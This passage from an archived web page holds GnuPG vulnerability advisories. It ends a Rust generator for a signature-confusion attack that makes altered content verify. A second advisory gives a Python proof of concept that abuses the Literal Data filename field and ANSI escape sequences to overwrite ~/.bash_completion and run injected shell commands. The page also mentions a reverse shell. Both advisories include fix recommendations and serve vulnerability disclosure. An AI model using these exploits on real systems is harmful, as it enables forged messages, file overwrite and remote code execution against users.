color:#E6EDF3">sig)</span><span style=3D"color:#FF7B72">.</span><span style=
=3D"color:#D2A8FF">expect</span><span style=3D"color:#E6EDF3">(</span><span=
 style=3D"color:#A5D6FF">"A one-pass sig to exist"</span><span style=3D"col=
or:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> lit </span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FFA657"> Litera=
l</span><span style=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF=
">new</span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FFA=
657">Binary</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> body </span><=
span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> rep</=
span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">as=
_bytes</span><span style=3D"color:#E6EDF3">()</span><span style=3D"color:#F=
F7B72">.</span><span style=3D"color:#D2A8FF">to_vec</span><span style=3D"co=
lor:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    body</span><span sty=
le=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">push</span><span=
 style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">'</span><spa=
n style=3D"color:#FF7B72">&#92;n</span><span style=3D"color:#A5D6FF">'</spa=
n><span style=3D"color:#FF7B72"> as</span><span style=3D"color:#FFA657"> u8=
</span><span style=3D"color:#E6EDF3">); </span><span style=3D"color:#8B949E=
">// just for viewing convenience</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    lit</span><span styl=
e=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">set_body</span><s=
pan style=3D"color:#E6EDF3">(body);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> mrk </span><span style=3D"color:#FF7B72">=3D</span><sp=
an style=3D"color:#FFA657"> Marker</span><span style=3D"color:#FF7B72">::</=
span><span style=3D"color:#D2A8FF">default</span><span style=3D"color:#E6ED=
F3">();</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> buf </span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> vec!</=
span><span style=3D"color:#E6EDF3">[];</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> msg </span><span style=3D"color:#FF7B72">=3D</span><sp=
an style=3D"color:#FFA657"> Message</span><span style=3D"color:#FF7B72">::<=
/span><span style=3D"color:#D2A8FF">new</span><span style=3D"color:#E6EDF3"=
>(</span><span style=3D"color:#FF7B72">&#x26;mut</span><span style=3D"color=
:#E6EDF3"> buf);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> msg </span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FFA657"> Armore=
r</span><span style=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF=
">new</span><span style=3D"color:#E6EDF3">(msg)</span><span style=3D"color:=
#FF7B72">.</span><span style=3D"color:#D2A8FF">build</span><span style=3D"c=
olor:#E6EDF3">()</span><span style=3D"color:#FF7B72">.</span><span style=3D=
"color:#D2A8FF">unwrap</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">    Packet</span><span s=
tyle=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">from</span><s=
pan style=3D"color:#E6EDF3">(ops)</span><span style=3D"color:#FF7B72">.</sp=
an><span style=3D"color:#D2A8FF">serialize</span><span style=3D"color:#E6ED=
F3">(</span><span style=3D"color:#FF7B72">&#x26;mut</span><span style=3D"co=
lor:#E6EDF3"> msg)</span><span style=3D"color:#FF7B72">.</span><span style=
=3D"color:#D2A8FF">unwrap</span><span style=3D"color:#E6EDF3">();</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FFA657">    Packet</span><span s=
tyle=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">from</span><s=
pan style=3D"color:#E6EDF3">(lit)</span><span style=3D"color:#FF7B72">.</sp=
an><span style=3D"color:#D2A8FF">serialize</span><span style=3D"color:#E6ED=
F3">(</span><span style=3D"color:#FF7B72">&#x26;mut</span><span style=3D"co=
lor:#E6EDF3"> msg)</span><span style=3D"color:#FF7B72">.</span><span style=
=3D"color:#D2A8FF">unwrap</span><span style=3D"color:#E6EDF3">();</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FFA657">    Packet</span><span s=
tyle=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">from</span><s=
pan style=3D"color:#E6EDF3">(sig)</span><span style=3D"color:#FF7B72">.</sp=
an><span style=3D"color:#D2A8FF">serialize</span><span style=3D"color:#E6ED=
F3">(</span><span style=3D"color:#FF7B72">&#x26;mut</span><span style=3D"co=
lor:#E6EDF3"> msg)</span><span style=3D"color:#FF7B72">.</span><span style=
=3D"color:#D2A8FF">unwrap</span><span style=3D"color:#E6EDF3">();</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FFA657">    Packet</span><span s=
tyle=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">from</span><s=
pan style=3D"color:#E6EDF3">(mrk)</span><span style=3D"color:#FF7B72">.</sp=
an><span style=3D"color:#D2A8FF">serialize</span><span style=3D"color:#E6ED=
F3">(</span><span style=3D"color:#FF7B72">&#x26;mut</span><span style=3D"co=
lor:#E6EDF3"> msg)</span><span style=3D"color:#FF7B72">.</span><span style=
=3D"color:#D2A8FF">unwrap</span><span style=3D"color:#E6EDF3">();</span></s=
pan>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    msg</span><span styl=
e=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">finalize</span><s=
pan style=3D"color:#E6EDF3">()</span><span style=3D"color:#FF7B72">.</span>=
<span style=3D"color:#D2A8FF">unwrap</span><span style=3D"color:#E6EDF3">()=
;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">    std</span><span styl=
e=3D"color:#FF7B72">::</span><span style=3D"color:#FFA657">fs</span><span s=
tyle=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">write</span><=
span style=3D"color:#E6EDF3">(sig_path, buf)</span><span style=3D"color:#FF=
7B72">.</span><span style=3D"color:#D2A8FF">unwrap</span><span style=3D"col=
or:#E6EDF3">();</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    println!</span><span=
 style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"Verify with=
:</span><span style=3D"color:#FF7B72">&#92;n&#92;t</span><span style=3D"col=
or:#A5D6FF">gpg --verify &#123;sig_path&#125;</span><span style=3D"color:#F=
F7B72">&#92;n</span><span style=3D"color:#A5D6FF">Extract with:</span><span=
 style=3D"color:#FF7B72">&#92;n&#92;t</span><span style=3D"color:#A5D6FF">g=
pg --decrypt &#123;sig_path&#125; > out</span><span style=3D"color:#FF7B72"=
>&#92;n&#92;t</span><span style=3D"color:#A5D6FF">cat out"</span><span styl=
e=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">fn</span><span style=3D"=
color:#D2A8FF"> main</span><span style=3D"color:#E6EDF3">() &#123;</span></=
span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> args_raw</span><span style=3D"color:#FF7B72">:</span><=
span style=3D"color:#FFA657"> Vec</span><span style=3D"color:#E6EDF3">&#x3C=
;_> </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FF=
A657"> std</span><span style=3D"color:#FF7B72">::</span><span style=3D"colo=
r:#FFA657">env</span><span style=3D"color:#FF7B72">::</span><span style=3D"=
color:#D2A8FF">args</span><span style=3D"color:#E6EDF3">()</span><span styl=
e=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">collect</span><sp=
an style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> args</span><span style=3D"color:#FF7B72">:</span><span=
 style=3D"color:#FFA657"> Vec</span><span style=3D"color:#E6EDF3">&#x3C;_> =
</span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3=
"> args_raw</span><span style=3D"color:#FF7B72">.</span><span style=3D"colo=
r:#D2A8FF">iter</span><span style=3D"color:#E6EDF3">()</span><span style=3D=
"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">map</span><span style=
=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">|</span><span styl=
e=3D"color:#E6EDF3">x</span><span style=3D"color:#FF7B72">|</span><span sty=
le=3D"color:#E6EDF3"> x</span><span style=3D"color:#FF7B72">.</span><span s=
tyle=3D"color:#D2A8FF">as_ref</span><span style=3D"color:#E6EDF3">())</span=
><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">collec=
t</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    match</span><span st=
yle=3D"color:#E6EDF3"> args[</span><span style=3D"color:#79C0FF">1</span><s=
pan style=3D"color:#FF7B72">..</span><span style=3D"color:#E6EDF3">] &#123;=
</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        [</span><span st=
yle=3D"color:#A5D6FF">"multi_plain"</span><span style=3D"color:#E6EDF3">, s=
ig, rep] </span><span style=3D"color:#FF7B72">=3D></span><span style=3D"col=
or:#D2A8FF"> multi_plain</span><span style=3D"color:#E6EDF3">(sig, rep),</s=
pan></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        _ </span><span s=
tyle=3D"color:#FF7B72">=3D></span><span style=3D"color:#D2A8FF"> println!</=
span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"U=
se with ./gen.rs multi_plain &#x3C;sig_path> &#x3C;replacement text>"</span=
><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <!----><pre class=3D"shiki github-dark-default" style=3D"b=
ackground-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"=
line"><span style=3D"color:#FFA657">./gen.rs</span><span style=3D"color:#A5=
D6FF"> multi_plain</span><span style=3D"color:#A5D6FF"> plaintext.sig</span=
><span style=3D"color:#A5D6FF"> Malicious</span></span></code></pre><!---->=
 <p>Bob verifies the message successfully and gets shown the malicious cont=
ent.</p> <!----><pre class=3D"shiki github-dark-default" style=3D"backgroun=
d-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><s=
pan style=3D"color:#FFA657">gpg</span><span style=3D"color:#79C0FF"> --veri=
fy</span><span style=3D"color:#A5D6FF"> plaintext.sig</span><span style=3D"=
color:#A5D6FF"> plaintext</span><span style=3D"color:#8B949E"> # Verifies</=
span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg</span><span style=3D=
"color:#79C0FF"> --decrypt</span><span style=3D"color:#A5D6FF"> plaintext.s=
ig</span><span style=3D"color:#8B949E"> # Verifies &#x26; prints "Malicious=
"</span></span></code></pre><!----> <p>Notes:</p> <ul><li>Technically runni=
ng <code>--verify</code> is not necessary on Bob=E2=80=99s end. It is only =
to show that both code paths get confused by this attack. <code>--decrypt</=
code> also includes verification. To quote from the man page:</li></ul> <!-=
---><pre class=3D"shiki github-dark-default" style=3D"background-color:#0d1=
117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span>--decryp=
t</span></span>
<span class=3D"line"><span>-d    Decrypt  the file given on the command lin=
e (or STDIN if no file is specified) and write it to STDOUT (or the file sp=
ecified with --output). If</span></span>
<span class=3D"line"><span>      the decrypted file is signed, the signatur=
e is also verified. This command differs from the default operation, as it =
never writes to the  file=E2=80=90</span></span>
<span class=3D"line"><span>      name which is included in the file and it =
rejects files that don't begin with an encrypted message.</span></span></co=
de></pre><!----> <ul><li>Running <code>gpg --verify plaintext.sig</code> pr=
ints a warning but still successfully verifies</li></ul> <h2>Recommendation=
s</h2> <p>Immediate fix of exploitation:</p> <!----><pre class=3D"shiki git=
hub-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=
=3D"0"><code><span class=3D"line"><span style=3D"color:#FF7B72">if</span><s=
pan style=3D"color:#E6EDF3"> (pkt</span><span style=3D"color:#FF7B72">-></s=
pan><span style=3D"color:#E6EDF3">pkttype </span><span style=3D"color:#FF7B=
72">!=3D</span><span style=3D"color:#E6EDF3"> PKT_SIGNATURE </span><span st=
yle=3D"color:#FF7B72">&#x26;&#x26;</span><span style=3D"color:#E6EDF3"> pkt=
</span><span style=3D"color:#FF7B72">-></span><span style=3D"color:#E6EDF3"=
>pkttype </span><span style=3D"color:#FF7B72">!=3D</span><span style=3D"col=
or:#E6EDF3"> PKT_MDC)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  c</span><span style=3D=
"color:#FF7B72">-></span><span style=3D"color:#E6EDF3">any.data </span><spa=
n style=3D"color:#FF7B72">|=3D</span><span style=3D"color:#E6EDF3"> (pkt</s=
pan><span style=3D"color:#FF7B72">-></span><span style=3D"color:#E6EDF3">pk=
ttype </span><span style=3D"color:#FF7B72">=3D=3D</span><span style=3D"colo=
r:#E6EDF3"> PKT_PLAINTEXT);</span></span></code></pre><!----> <p>If <code>c=
->any.data</code> is not allowed to turn back to false, exploitation is imp=
ossible.</p> <p>In the long run, the state machine should be reworked. A lo=
t of security-critical mechanisms like <code>c->any.data</code> and other m=
ultiple plaintext mitigations are dependent on state and are measured in br=
ittle ways, e.g. by checking for detached vs. full/clear signatures by coun=
ting the plaintext packets while parsing, instead of checking ahead of time=
 whether the shape of the input is sane.</p><!----></article><!----><!---->=
</main> <footer class=3D"bg-blue-500 p-4">contact: <a href=3D"/cdn-cgi/l/em=
ail-protection" class=3D"__cf_email__" data-cfemail=3D"1e7d71706a7f7d6a5e79=
6e7930787f7772">[email&#160;protected]</a></footer><!----><!--]--> <!--[!--=
><!--]--><!--]--><script data-cfasync=3D"false" src=3D"/cdn-cgi/scripts/5c5=
dd728/cloudflare-static/email-decode.min.js"></script></body>
</html>

--1yeeQ81UyVL57Vl7
Content-Type: text/html; charset=utf-8
Content-Disposition: attachment; filename="02-filename.html"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html lang=3D"en">
	<head>
		<meta charset=3D"utf-8" />
		<meta name=3D"darkreader-lock" />
		<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1" />
		<link rel=3D"manifest" href=3D"/manifest.webmanifest">
        <link rel=3D"icon" href=3D"/favicon.ico" sizes=3D"32x32">
        <link rel=3D"icon" href=3D"/icon.svg" type=3D"image/svg+xml">
        <link rel=3D"apple-touch-icon" href=3D"/apple-touch-icon.png">
=09=09
		<link href=3D"./_app/immutable/assets/0.B3PCwX-h.css" rel=3D"stylesheet">=
<!--12qhfyh--><!----><title>gpg.fail</title>
	</head>
	<body><!--[--><!--[--><!----><main class=3D"min-w-full max-w-[1280px] my-a=
uto bg-green-500 p-4 space-y-4"><!----><article class=3D"prose mx-auto"><h1=
>GnuPG Accepts Path Separators and Path Traversals in Literal Data "Filenam=
e" Field</h1> <!----><p><em>GnuPG</em> accepts arbitrary <strong>file paths=
</strong> in the unsigned Literal Data packet <strong>filename</strong> fie=
ld and uses that value without sufficient sanitization.</p> <h2>Impact</h2>=
 <p>In combination with tricking a user with ANSI formatted output that cha=
nges <em>GnuPG</em> output with deceptive apparent <em>GnuPG</em> logs, thi=
s can lead to creation or overwrite of any file on the system the user can =
write to. This commonly includes regularly executed scripts and programs le=
ading to remote code execution (RCE).</p> <h2>Details</h2> <p>Literal Data =
parsing copies <code>namelen</code> bytes from the packet into <code>pt->na=
me</code> without sanitizing or restricting directory separators or travers=
al sequences.</p> <!----><pre class=3D"shiki github-dark-default" style=3D"=
background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D=
"line"><span style=3D"color:#E6EDF3">    pt</span><span style=3D"color:#FF7=
B72">-></span><span style=3D"color:#E6EDF3">namelen </span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> namelen;</span></spa=
n>
<span class=3D"line"><span style=3D"color:#E6EDF3">    pt</span><span style=
=3D"color:#FF7B72">-></span><span style=3D"color:#E6EDF3">is_partial </span=
><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> par=
tial;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (pktlen) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        for</span><span =
style=3D"color:#E6EDF3"> (i </span><span style=3D"color:#FF7B72">=3D</span>=
<span style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">; pktl=
en </span><span style=3D"color:#FF7B72">></span><span style=3D"color:#79C0F=
F"> 4</span><span style=3D"color:#FF7B72"> &#x26;&#x26;</span><span style=
=3D"color:#E6EDF3"> i </span><span style=3D"color:#FF7B72">&#x3C;</span><sp=
an style=3D"color:#E6EDF3"> namelen; pktlen</span><span style=3D"color:#FF7=
B72">--</span><span style=3D"color:#E6EDF3">, i</span><span style=3D"color:=
#FF7B72">++</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            pt->name[i] =
</span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF=
"> iobuf_get_noeof</span><span style=3D"color:#E6EDF3">(inp);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>=
</code></pre><!----> <p>This data is then processed by <code>get_output_fil=
e</code> which performs no sanitization and treats the file name field as a=
 file path.</p> <p>To quote from the <em>GnuPG</em> man page:</p> <blockquo=
te><p>Note also that unless a modern version 5 signature is used the embedd=
ed filename is not part of the signed data.</p></blockquote> <p>This makes =
attacks in certain scenarios more likely as an attacker might modify/insert=
 this to more easily deceive an inattentive user.</p> <h3>Detailed steps to=
 reproduce</h3> <h4>Scenario</h4> <ul><li>Mallory, an attacker, sends Bob a=
 message with the goal to overwrite Bob=E2=80=99s bash completion script to=
 gain remote code execution.</li> <li>Bob follows the relatively secure loo=
king comment in a terminal running bash with ANSI support</li></ul> <h4>Pro=
cedure</h4> <ul><li>The first command <code>gpg --decrypt pts.enc</code> pr=
epares a deceiving ANSI prompt (could be any message that the user is likel=
y to accept)</li> <li>The subsequent <code>gpg pts.enc</code> then overwrit=
es any file, we choose the <code>~/.bash_completion</code> file to gain RCE=
. We choose <code>~/.bash_completion</code> as it does not exist by default=
 on most systems.</li> <li>Mallory creates malicious message using poc.py (=
dependencies in the appendix section)</li></ul> <!----><pre class=3D"shiki =
github-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tabin=
dex=3D"0"><code><span class=3D"line"><span style=3D"color:#FF7B72">from</sp=
an><span style=3D"color:#E6EDF3"> literal_data </span><span style=3D"color:=
#FF7B72">import</span><span style=3D"color:#E6EDF3"> LiteralDataEncoding, L=
iteralDataPacket</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">from</span><span style=
=3D"color:#E6EDF3"> packets </span><span style=3D"color:#FF7B72">import</sp=
an><span style=3D"color:#E6EDF3"> Packet, PacketType</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">from</span><span style=
=3D"color:#E6EDF3"> armor </span><span style=3D"color:#FF7B72">import</span=
><span style=3D"color:#E6EDF3"> ArmorSectionType, </span><span style=3D"col=
or:#79C0FF">BEGIN</span><span style=3D"color:#E6EDF3">, </span><span style=
=3D"color:#79C0FF">END</span><span style=3D"color:#E6EDF3">, </span><span s=
tyle=3D"color:#79C0FF">DASHES</span><span style=3D"color:#E6EDF3">, crc24, =
standard_b64encode</span></span>
<span class=3D"line"></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">encoding </span><span st=
yle=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> LiteralDataE=
ncoding.Text</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">ld_packet </span><span s=
tyle=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> LiteralData=
Packet(</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">    encoding</span><span=
 style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3">encoding,<=
/span></span>
<span class=3D"line"><span style=3D"color:#FFA657">    file_name</span><spa=
n style=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">"/home/ni=
ne/.bash_completion"</span><span style=3D"color:#E6EDF3">, </span><span sty=
le=3D"color:#FFA657">data</span><span style=3D"color:#FF7B72">=3D</span><sp=
an style=3D"color:#FF7B72">b</span><span style=3D"color:#A5D6FF">"""</span>=
<span style=3D"color:#79C0FF"></span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">#</span><span style=3D"c=
olor:#FF7B72">=1B</span><span style=3D"color:#A5D6FF">[K</span><span style=
=3D"color:#FF7B72">=1B</span><span style=3D"color:#A5D6FF">[Dgpg: WARNING: =
Message contains no signatures. Continue viewing [Y/n]?</span><span style=
=3D"color:#FF7B72">=1B</span><span style=3D"color:#A5D6FF">[8m</span><span =
style=3D"color:#FF7B72">&#92;n</span><span style=3D"color:#A5D6FF">echo pwn=
ed</span><span style=3D"color:#FF7B72">=1B</span><span style=3D"color:#A5D6=
FF">]2;</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">"""</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">packet </span><span styl=
e=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> Packet(</span>=
</span>
<span class=3D"line"><span style=3D"color:#FFA657">    legacy</span><span s=
tyle=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF">True</span><=
span style=3D"color:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">    packet_type</span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3">PacketT=
ype.LiteralData,</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">    body</span><span sty=
le=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3">ld_packet,</sp=
an></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">data </span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> bytes</span><sp=
an style=3D"color:#E6EDF3">(packet)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">header </span><span styl=
e=3D"color:#FF7B72">=3D</span><span style=3D"color:#FF7B72"> f</span><span =
style=3D"color:#A5D6FF">"</span><span style=3D"color:#FF7B72">&#123;</span>=
<span style=3D"color:#79C0FF">BEGIN</span><span style=3D"color:#FF7B72">&#1=
25;&#123;</span><span style=3D"color:#E6EDF3">ArmorSectionType.</span><span=
 style=3D"color:#79C0FF">PGP_ARMORED_FILE</span><span style=3D"color:#E6EDF=
3">.value</span><span style=3D"color:#FF7B72">&#125;&#123;</span><span styl=
e=3D"color:#79C0FF">DASHES</span><span style=3D"color:#FF7B72">&#125;</span=
><span style=3D"color:#A5D6FF">"</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">footer </span><span styl=
e=3D"color:#FF7B72">=3D</span><span style=3D"color:#FF7B72"> f</span><span =
style=3D"color:#A5D6FF">"</span><span style=3D"color:#FF7B72">&#123;</span>=
<span style=3D"color:#79C0FF">END</span><span style=3D"color:#FF7B72">&#125=
;&#123;</span><span style=3D"color:#E6EDF3">ArmorSectionType.</span><span s=
tyle=3D"color:#79C0FF">PGP_ARMORED_FILE</span><span style=3D"color:#E6EDF3"=
>.value</span><span style=3D"color:#FF7B72">&#125;&#123;</span><span style=
=3D"color:#79C0FF">DASHES</span><span style=3D"color:#FF7B72">&#125;</span>=
<span style=3D"color:#A5D6FF">"</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">b64_data </span><span st=
yle=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> standard_b64=
encode(data).decode(</span><span style=3D"color:#A5D6FF">"utf8"</span><span=
 style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">lines </span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> []</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">while</span><span style=
=3D"color:#79C0FF"> len</span><span style=3D"color:#E6EDF3">(b64_data) </sp=
an><span style=3D"color:#FF7B72">>=3D</span><span style=3D"color:#79C0FF"> =
64</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    lines.append(b64_dat=
a[:</span><span style=3D"color:#79C0FF">64</span><span style=3D"color:#E6ED=
F3">])</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    b64_data </span><spa=
n style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> b64_data=
[</span><span style=3D"color:#79C0FF">64</span><span style=3D"color:#E6EDF3=
">:]</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">if</span><span style=3D"=
color:#E6EDF3"> b64_data:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    lines.append(b64_dat=
a)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">checksum </span><span st=
yle=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> crc24(data).=
to_bytes(</span><span style=3D"color:#FFA657">length</span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#79C0FF">3</span><span style=
=3D"color:#E6EDF3">, </span><span style=3D"color:#FFA657">byteorder</span><=
span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">"big"<=
/span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">b64_checksum </span><spa=
n style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> standard=
_b64encode(checksum).decode(</span><span style=3D"color:#A5D6FF">"utf8"</sp=
an><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#79C0FF">print</span><span style=
=3D"color:#E6EDF3">(header)</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">print</span><span style=
=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"Comment: open wit=
h &#96;gpg --decrypt pts.enc &#x26;&#x26; gpg pts.enc&#96;"</span><span sty=
le=3D"color:#FF7B72"> +</span><span style=3D"color:#A5D6FF"> "</span><span =
style=3D"color:#FF7B72">&#92;n</span><span style=3D"color:#A5D6FF">"</span>=
<span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">for</span><span style=3D=
"color:#E6EDF3"> line </span><span style=3D"color:#FF7B72">in</span><span s=
tyle=3D"color:#E6EDF3"> lines:</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">    print</span><span st=
yle=3D"color:#E6EDF3">(line)</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">print</span><span style=
=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">f</span><span styl=
e=3D"color:#A5D6FF">"=3D</span><span style=3D"color:#FF7B72">&#123;</span><=
span style=3D"color:#E6EDF3">b64_checksum</span><span style=3D"color:#FF7B7=
2">&#125;</span><span style=3D"color:#A5D6FF">"</span><span style=3D"color:=
#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">print</span><span style=
=3D"color:#E6EDF3">(footer)</span></span></code></pre><!----> <ul><li>Mallo=
ry sends the output of <code>python3 poc.py > pts.enc</code> to Bob.</li> <=
li>Bob naively opens the file using the comment in the message, and accepts=
 the prompt as it does not seem to imply any security risk:</li></ul> <!---=
-><pre class=3D"shiki github-dark-default" style=3D"background-color:#0d111=
7;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span>$ gpg --de=
crypt pts.enc &#x26;&#x26; gpg pts.enc</span></span>
<span class=3D"line"><span>gpg: WARNING: Message contains no signatures. Co=
ntinue viewing [Y/n]?</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>$ bash</span></span>
<span class=3D"line"><span>pwned$</span></span></code></pre><!----> <p>Note=
, that instead of <code>echo pwned</code> we could have set up a <a href=3D=
"https://www.sysdig.com/learn-cloud-native/what-is-a-reverse-shell" rel=3D"=
nofollow">reverse shell</a>.</p> <h2>Recommendations</h2> <ul><li><em>GnuPG=
</em> should warn the user before outputting binary data such as ANSI contr=
ol sequences to the users terminal.</li> <li><em>GnuPG</em> may consider no=
t using the embedded file name as the default</li> <li><em>GnuPG</em> shoul=
d not accept <em>file paths</em> in the <em>filename</em> field</li> <li>Us=
ers should be careful when using <code>gpg &lt;filename></code> and should =
instead specify the intended subcommand.</li></ul> <h2>Appendix</h2> <p>buf=
